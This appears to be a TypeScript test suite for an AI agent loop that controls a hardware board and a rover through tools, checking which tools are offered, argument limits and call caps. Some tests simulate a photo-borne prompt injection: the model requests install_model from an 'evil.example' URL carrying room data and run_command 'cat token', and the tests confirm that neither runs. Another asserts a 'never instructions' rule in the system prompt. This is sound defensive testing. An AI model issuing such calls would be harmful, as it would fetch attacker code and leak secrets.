/**
 * Drives the tool loop with a scripted model and board: it passes tools and results along, photos reach the model as
 * images, a bad call goes back to the model, and it always ends.
 *
 *   npx tsx --test lib/device/__tests__/agent.test.ts
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import type { Response as ModelResponse, ResponseCreateParamsNonStreaming } from "openai/resources/responses/responses";
import { MAX_MODEL_CALLS, MAX_OUTPUT_TOKENS, MAX_TOOL_CALLS, runDeviceAgent, type DeviceAgentDeps } from "@/lib/device/agent";
import type { DeviceToolResult } from "@/lib/device/client";

const toolCall = (name: string, args = "{}", callId = "call-1") => ({ type: "function_call", name, arguments: args, call_id: callId });
const reply = (id: string, output: unknown[], text = "") => ({ id, output, output_text: text }) as unknown as ModelResponse;

const PHOTO: DeviceToolResult = { content: [{ type: "image", data: "abc", mimeType: "image/jpeg" }], isError: false };

function harness(replies: ModelResponse[] | (() => ModelResponse), results: Record<string, DeviceToolResult> = {}) {
  const bodies: ResponseCreateParamsNonStreaming[] = [];
  const called: Array<{ name: string; args: unknown }> = [];
  const deps: DeviceAgentDeps = {
    model: "test-model",
    respond: async (body) => {
      bodies.push(body);
      return typeof replies === "function" ? replies() : replies[bodies.length - 1]!;
    },
    listTools: async () => [{ name: "capture_image", description: "Takes a photo.", inputSchema: { type: "object" } }],
    callTool: async (name, args) => {
      called.push({ name, args });
      return results[name] ?? { content: [{ type: "text", text: "ok" }], isError: false };
    },
  };
  return { bodies, called, deps };
}

const outputsOf = (body: ResponseCreateParamsNonStreaming) =>
  (body.input as unknown as Array<{ type?: string; call_id: string; output: unknown[] }>).filter((item) => item.type === "function_call_output");
const outputOf = (body: ResponseCreateParamsNonStreaming) => outputsOf(body)[0]!;

describe("runDeviceAgent", () => {
  it("answers without the board when the model needs no tool", async () => {
    const h = harness([reply("r1", [], "Hello.")]);
    assert.deepEqual(await runDeviceAgent("hi", h.deps), { answer: "Hello.", steps: [] });
    assert.deepEqual(h.called, []);
    assert.deepEqual(h.bodies[0]!.input, [{ role: "user", content: "hi" }]);
  });

  it("offers the board's own tools on every call", async () => {
    const h = harness([reply("r1", [toolCall("capture_image")]), reply("r2", [], "Done.")], { capture_image: PHOTO });
    await runDeviceAgent("look", h.deps);
    for (const body of h.bodies) {
      assert.equal(body.tools?.[0]?.type, "function");
      assert.equal((body.tools?.[0] as { name: string }).name, "capture_image");
      assert.ok(body.instructions);
    }
  });

  it("calls the tool the model asks for and shows the model the photo", async () => {
    const h = harness([reply("r1", [toolCall("capture_image", '{"width":640}')]), reply("r2", [], "A desk.")], { capture_image: PHOTO });
    const result = await runDeviceAgent("what do you see?", h.deps);
    assert.deepEqual(h.called, [{ name: "capture_image", args: { width: 640 } }]);
    // The whole conversation goes along, and nothing is left on the server to expire while a slow tool runs.
    assert.equal(h.bodies[1]!.store, false);
    assert.equal(h.bodies[1]!.previous_response_id, undefined);
    assert.deepEqual((h.bodies[1]!.input as unknown as Array<{ role?: string; type?: string }>).map((item) => item.role ?? item.type), ["user", "function_call", "function_call_output"]);
    assert.equal(outputOf(h.bodies[1]!).call_id, "call-1");
    assert.deepEqual(outputOf(h.bodies[1]!).output, [{ type: "input_image", image_url: "data:image/jpeg;base64,abc", detail: "auto" }]);
    assert.equal(result.answer, "A desk.");
    assert.deepEqual(result.steps, [{ tool: "capture_image", arguments: { width: 640 }, ...PHOTO }]);
  });

  it("keeps audio for the reply but gives the model a note instead", async () => {
    const audio: DeviceToolResult = {
      content: [
        { type: "text", text: '{"rms":5}' },
        { type: "audio", data: "wav", mimeType: "audio/wav" },
      ],
      isError: false,
    };
    const h = harness([reply("r1", [toolCall("record_audio")]), reply("r2", [], "Quiet.")], { record_audio: audio });
    const result = await runDeviceAgent("listen", h.deps);
    const sent = JSON.stringify(outputOf(h.bodies[1]!).output);
    assert.match(sent, /rms/);
    assert.doesNotMatch(sent, /wav"|"wav/);
    assert.deepEqual(result.steps[0]!.content, audio.content);
  });

  it("gives a tool's own failure to the model to explain", async () => {
    const failed: DeviceToolResult = { content: [{ type: "text", text: "No camera." }], isError: true };
    const h = harness([reply("r1", [toolCall("capture_image")]), reply("r2", [], "No camera is attached.")], { capture_image: failed });
    const result = await runDeviceAgent("look", h.deps);
    assert.equal(result.steps[0]!.isError, true);
    assert.deepEqual(outputOf(h.bodies[1]!).output, [{ type: "input_text", text: "No camera." }]);
    assert.equal(result.answer, "No camera is attached.");
  });

  it("sends arguments that aren't an object back to the model without touching the board", async () => {
    for (const bad of ["{oops", "[1]"]) {
      const h = harness([reply("r1", [toolCall("capture_image", bad)]), reply("r2", [], "Sorry.")]);
      const result = await runDeviceAgent("look", h.deps);
      assert.deepEqual(h.called, []);
      assert.equal(result.steps[0]!.isError, true);
    }
  });

  it("answers every call of a parallel request", async () => {
    const h = harness([reply("r1", [toolCall("a", "{}", "c1"), toolCall("b", "{}", "c2")]), reply("r2", [], "Both.")]);
    await runDeviceAgent("both", h.deps);
    const input = outputsOf(h.bodies[1]!);
    assert.deepEqual(input.map((item) => item.call_id), ["c1", "c2"]);
  });

  it("stops offering tools on its last call, so a model that keeps asking still ends", async () => {
    const h = harness(() => reply("r", [toolCall("capture_image")]));
    const result = await runDeviceAgent("again and again", h.deps);
    assert.equal(h.bodies.length, MAX_MODEL_CALLS);
    assert.deepEqual(h.bodies.map((b) => b.tools?.length ?? 0).slice(-2), [1, 0]);
    assert.ok(h.bodies.every((b) => b.tool_choice === undefined || b.tool_choice === "auto"));
    assert.equal(result.answer, "");
  });

  const everyTool = ["describe_device", "capture_image", "training_status", "train_model", "stop_training", "start_model", "install_model", "save_dataset", "run_command"];
  const offered = (body: ResponseCreateParamsNonStreaming) => (body.tools as unknown as Array<{ name: string }>).map((tool) => tool.name);

  it("offers only tools that change nothing, unless the question is about training or models", async () => {
    const h = harness([reply("r1", [], "A desk.")]);
    h.deps.listTools = async () => everyTool.map((name) => ({ name, inputSchema: { type: "object" } }));
    await runDeviceAgent("what's on the desk?", h.deps);
    assert.deepEqual(offered(h.bodies[0]!), ["describe_device", "capture_image", "training_status"]);
  });

  it("offers the training tools when the person asks, and never the ones that fetch, overwrite or run anything", async () => {
    for (const prompt of ["train a model on bakery", "Fine-tune it", "stop the run", "load the tuned adapter"]) {
      const h = harness([reply("r1", [], "Started.")]);
      h.deps.listTools = async () => everyTool.map((name) => ({ name, inputSchema: { type: "object" } }));
      await runDeviceAgent(prompt, h.deps);
      assert.deepEqual(offered(h.bodies[0]!), ["describe_device", "capture_image", "training_status", "train_model", "stop_training", "start_model"], prompt);
    }
  });

  const READ_ONLY = ["describe_device", "capture_image", "training_status"];
  const ALL_OFFERED = [...READ_ONLY, "train_model", "stop_training", "start_model"];
  const withEveryTool = (replies: ModelResponse[] | (() => ModelResponse)) => {
    const h = harness(replies);
    h.deps.listTools = async () => everyTool.map((name) => ({ name, inputSchema: { type: "object" } }));
    return h;
  };

  it("doesn't take everyday words or a refusal as asking to change the board", async () => {
    for (const prompt of [
      "What model of camera is attached?",
      "Which model is this board?",
      "Read the stop sign in this photo",
      "Do not stop anything, just describe the board",
      "Please don't train anything, how hot is it?",
      "Please don\u2019t stop the run, how far along is it?",
      "is the guitar in tune? listen",
      "Is the train on time in this photo?",
    ]) {
      const h = withEveryTool([reply("r1", [], "Sure.")]);
      await runDeviceAgent(prompt, h.deps);
      assert.deepEqual(offered(h.bodies[0]!), READ_ONLY, prompt);
    }
  });

  it("still takes plain requests as asking", async () => {
    for (const prompt of ["Retrain it on the bakery data", "stop training", "start the model", "Unload the model", "train on bakery", "tune this model"]) {
      const h = withEveryTool([reply("r1", [], "Sure.")]);
      await runDeviceAgent(prompt, h.deps);
      assert.deepEqual(offered(h.bodies[0]!), ALL_OFFERED, prompt);
    }
  });

  it("stops offering what changes the board once a photo or a model's answer is in the conversation", async () => {
    for (const source of ["capture_image", "ask_model"]) {
      const h = withEveryTool([reply("r1", [toolCall(source)]), reply("r2", [toolCall("stop_training")]), reply("r3", [], "Done.")]);
      const result = await runDeviceAgent("train a model on bakery", h.deps);
      assert.deepEqual(offered(h.bodies[0]!), ALL_OFFERED, source);
      assert.deepEqual(offered(h.bodies[1]!), READ_ONLY, source);
      // Asking anyway does nothing, including later in the same reply.
      assert.deepEqual(h.called.map((c) => c.name), [source]);
      assert.equal(result.steps[1]!.isError, true);
    }
    const same = withEveryTool([reply("r1", [toolCall("capture_image", "{}", "c1"), toolCall("train_model", "{}", "c2")]), reply("r2", [], "Done.")]);
    await runDeviceAgent("train a model on bakery", same.deps);
    assert.deepEqual(same.called.map((c) => c.name), ["capture_image"]);
  });

  it("goes on offering them after a look at what's attached", async () => {
    const h = withEveryTool([reply("r1", [toolCall("describe_device")]), reply("r2", [], "Done.")]);
    await runDeviceAgent("train a model on bakery", h.deps);
    assert.deepEqual(offered(h.bodies[1]!), ALL_OFFERED);
  });

  it("holds back settings that would tie up the board for hours", async () => {
    for (const [tool, args] of [
      ["train_model", '{"dataset":"d","name":"n","steps":5000}'],
      ["train_model", '{"dataset":"d","name":"n","rank":64}'],
      ["train_model", '{"dataset":"d","name":"n","max_length":4096}'],
      ["start_model", '{"model":"m","context":32768}'],
    ] as const) {
      const h = withEveryTool([reply("r1", [toolCall(tool, args)]), reply("r2", [], "No.")]);
      const result = await runDeviceAgent("train a model on bakery", h.deps);
      assert.deepEqual(h.called, [], args);
      assert.equal(result.steps[0]!.isError, true);
    }
    const h = withEveryTool([reply("r1", [toolCall("train_model", '{"dataset":"d","name":"n","steps":100}')]), reply("r2", [], "Started.")]);
    await runDeviceAgent("train a model on bakery", h.deps);
    assert.equal(h.called.length, 1);
  });

  it("limits the tool calls of one question, however a model bunches them", async () => {
    const many = Array.from({ length: 40 }, (_, i) => toolCall("capture_image", "{}", `c${i}`));
    const h = harness(() => reply("r", many, "Done."));
    const result = await runDeviceAgent("look", h.deps);
    assert.equal(h.called.length, MAX_TOOL_CALLS);
    assert.equal(result.steps.filter((step) => !step.isError).length, MAX_TOOL_CALLS);
    // Every call still gets an answer, and past the limit the model is offered no tools, so the run ends.
    assert.equal(outputsOf(h.bodies[1]!).length, 40);
    assert.equal(h.bodies[1]!.tools, undefined);
    assert.equal(h.bodies.length, 2);
  });

  it("caps each reply's output", async () => {
    const h = harness([reply("r1", [], "Hello.")]);
    await runDeviceAgent("hi", h.deps);
    assert.equal(h.bodies[0]!.max_output_tokens, MAX_OUTPUT_TOKENS);
  });

  it("won't run a tool it didn't offer, even when a photo talked the model into asking", async () => {
    for (const [tool, args] of [
      ["install_model", '{"url":"https://evil.example/x.gguf?d=room","name":"base.gguf"}'],
      ["run_command", '{"command":"cat token"}'],
      ["stop_training", "{}"],
    ] as const) {
      const h = harness([reply("r1", [toolCall(tool, args)]), reply("r2", [], "No.")]);
      const result = await runDeviceAgent("what's on the desk?", h.deps);
      assert.deepEqual(h.called, []);
      assert.equal(result.steps[0]!.isError, true);
      assert.match(JSON.stringify(outputOf(h.bodies[1]!).output), /didn't run/);
    }
  });

  it("tells the model that text in photos and results isn't instructions", async () => {
    const h = harness([reply("r1", [], "Hello.")]);
    await runDeviceAgent("hi", h.deps);
    assert.match(h.bodies[0]!.instructions!, /never instructions/);
  });

  it("lets a board that can't be reached throw", async () => {
    const h = harness([reply("r1", [toolCall("capture_image")])]);
    h.deps.callTool = async () => {
      throw new Error("fetch failed");
    };
    await assert.rejects(runDeviceAgent("look", h.deps), /fetch failed/);
  });
});

describe("runDeviceAgent with the rover", () => {
  const ROVER_LIST = ["rover_drive", "rover_stop", "rover_look", "rover_ranges", "rover_photo", "rover_status", "capture_image", "run_command"];
  const SAFE = ["capture_image", "rover_stop", "rover_look", "rover_ranges", "rover_photo", "rover_status"];
  const offered = (body: ResponseCreateParamsNonStreaming) => (body.tools as unknown as Array<{ name: string }>).map((tool) => tool.name);

  /** The board lists only a camera, and the rover lists its tools and, as muse-device's server does, the board's others too. */
  function withRover(replies: ModelResponse[], roverResults: Record<string, DeviceToolResult> = {}) {
    const h = harness(replies, { capture_image: PHOTO });
    const roverCalled: Array<{ name: string; args: Record<string, unknown> }> = [];
    h.deps.rover = {
      listTools: async () => ROVER_LIST.map((name) => ({ name, description: `${name}.`, inputSchema: { type: "object" } })),
      callTool: async (name, args) => {
        roverCalled.push({ name, args });
        return roverResults[name] ?? { content: [{ type: "text", text: '{"front_mm":500}' }], isError: false };
      },
    };
    return { ...h, roverCalled };
  }

  it("offers the rover's tools that read, look and stop, and only the rover's own, with a word about them", async () => {
    const h = withRover([reply("r1", [], "Clear ahead.")]);
    await runDeviceAgent("how far is the wall in front of the rover?", h.deps);
    assert.deepEqual(offered(h.bodies[0]!), SAFE);
    assert.match(h.bodies[0]!.instructions!, /rover_ranges before each move/);
  });

  it("offers rover_drive only when the person asks for a move, and not when they say not to", async () => {
    for (const prompt of ["Drive forward a little", "turn left and take a photo", "go forward until the wall", "back up", "move closer to the door", "Can you steer it around the box?"]) {
      const h = withRover([reply("r1", [], "Sure.")]);
      await runDeviceAgent(prompt, h.deps);
      assert.deepEqual(offered(h.bodies[0]!), ["capture_image", "rover_drive", "rover_stop", "rover_look", "rover_ranges", "rover_photo", "rover_status"], prompt);
    }
    for (const prompt of ["Did anything move in the photo?", "What's on the left?", "whose turn is it on the board?", "Don't drive, just tell me what's ahead", "How did the setup go?"]) {
      const h = withRover([reply("r1", [], "Sure.")]);
      await runDeviceAgent(prompt, h.deps);
      assert.deepEqual(offered(h.bodies[0]!), SAFE, prompt);
    }
  });

  it("takes rover_drive away once a photo from either camera is in the conversation", async () => {
    for (const photo of ["rover_photo", "capture_image"]) {
      const h = withRover(
        [reply("r1", [toolCall("rover_ranges", "{}", "c1"), toolCall(photo, "{}", "c2")]), reply("r2", [toolCall("rover_drive", '{"left":100,"right":100}')]), reply("r3", [], "Done.")],
        { rover_photo: PHOTO },
      );
      const result = await runDeviceAgent("drive forward and look", h.deps);
      assert.ok(offered(h.bodies[0]!).includes("rover_drive"), photo);
      assert.ok(!offered(h.bodies[1]!).includes("rover_drive"), photo);
      assert.ok(offered(h.bodies[1]!).includes("rover_stop"), photo);
      assert.ok(!h.roverCalled.some((c) => c.name === "rover_drive"), photo);
      assert.equal(result.steps.at(-1)!.isError, true);
    }
  });

  it("goes on offering rover_drive after a reading of the ranges", async () => {
    const h = withRover([reply("r1", [toolCall("rover_ranges")]), reply("r2", [], "Done.")]);
    await runDeviceAgent("drive forward", h.deps);
    assert.ok(offered(h.bodies[1]!).includes("rover_drive"));
  });

  it("holds a drive to a short, slower one that waits, and fills in ms so leaving it out can't drive longer", async () => {
    for (const args of ['{"left":100,"right":100,"ms":1500}', '{"left":200,"right":100}', '{"left":100,"right":-255}', '{"left":100}', '{"direction":"forward"}']) {
      const h = withRover([reply("r1", [toolCall("rover_drive", args)]), reply("r2", [], "No.")]);
      const result = await runDeviceAgent("drive forward", h.deps);
      assert.deepEqual(h.roverCalled, [], args);
      assert.equal(result.steps[0]!.isError, true);
      assert.match(JSON.stringify(outputOf(h.bodies[1]!).output), /didn't run/);
    }
    const h = withRover([reply("r1", [toolCall("rover_drive", '{"left":-120,"right":120,"wait":false,"note":"x"}')]), reply("r2", [], "Turned.")]);
    await runDeviceAgent("turn left", h.deps);
    assert.deepEqual(h.roverCalled, [{ name: "rover_drive", args: { left: -120, right: 120, ms: 500, wait: true } }]);
    // The model is told the limits it's held to, not the rover's own wider ones.
    const drive = (h.bodies[0]!.tools as unknown as Array<{ name: string; parameters: { properties: { left: { maximum: number }; ms: { maximum: number } } } }>).find((tool) => tool.name === "rover_drive")!;
    assert.equal(drive.parameters.properties.left.maximum, 160);
    assert.equal(drive.parameters.properties.ms.maximum, 1000);
  });

  it("checks a look, and passes the rover's other tools their arguments as they are", async () => {
    const h = withRover([reply("r1", [toolCall("rover_look", '{"pan":120}', "c1"), toolCall("rover_photo", '{"width":320}', "c2")]), reply("r2", [], "Done.")], { rover_photo: PHOTO });
    const result = await runDeviceAgent("what's to the right of the rover?", h.deps);
    assert.equal(result.steps[0]!.isError, true);
    assert.deepEqual(h.roverCalled, [{ name: "rover_photo", args: { width: 320 } }]);
  });

  it("calls the rover for its tools and the board for the board's", async () => {
    const h = withRover([reply("r1", [toolCall("rover_ranges", "{}", "c1"), toolCall("capture_image", "{}", "c2")]), reply("r2", [], "Both.")]);
    await runDeviceAgent("what's around the rover?", h.deps);
    assert.deepEqual(h.roverCalled.map((c) => c.name), ["rover_ranges"]);
    assert.deepEqual(h.called.map((c) => c.name), ["capture_image"]);
  });

  it("won't let the board stand in for the rover, or the rover's list bring anything else", async () => {
    const h = withRover([reply("r1", [toolCall("run_command", '{"command":"ls"}')]), reply("r2", [], "No.")]);
    h.deps.listTools = async () => ["capture_image", "rover_drive"].map((name) => ({ name, inputSchema: { type: "object" } }));
    const result = await runDeviceAgent("drive forward", h.deps);
    const names = offered(h.bodies[0]!);
    assert.equal(names.filter((name) => name === "rover_drive").length, 1);
    assert.ok(!names.includes("run_command"));
    assert.equal(result.steps[0]!.isError, true);
    assert.deepEqual([...h.called, ...h.roverCalled], []);
  });

  it("goes on without the rover when it doesn't answer or isn't set up", async () => {
    const h = withRover([reply("r1", [toolCall("rover_drive", '{"left":100,"right":100}')]), reply("r2", [], "No rover.")]);
    h.deps.rover!.listTools = async () => {
      throw new Error("The tool server has not made its token yet.");
    };
    const result = await runDeviceAgent("drive forward", h.deps);
    assert.deepEqual(offered(h.bodies[0]!), ["capture_image"]);
    assert.doesNotMatch(h.bodies[0]!.instructions!, /rover/);
    assert.deepEqual(h.roverCalled, []);
    assert.equal(result.answer, "No rover.");
  });

  it("gives a rover that fails partway to the model as a failed tool", async () => {
    const h = withRover([reply("r1", [toolCall("rover_stop")]), reply("r2", [], "It didn't answer.")]);
    h.deps.rover!.callTool = async () => {
      throw new Error("fetch failed for https://fleet.example.com/admin/device/ArduinoQ-01/mcp");
    };
    const result = await runDeviceAgent("stop", h.deps);
    assert.equal(result.steps[0]!.isError, true);
    assert.doesNotMatch(JSON.stringify(result), /fleet\.example/);
    assert.equal(result.answer, "It didn't answer.");
  });
});
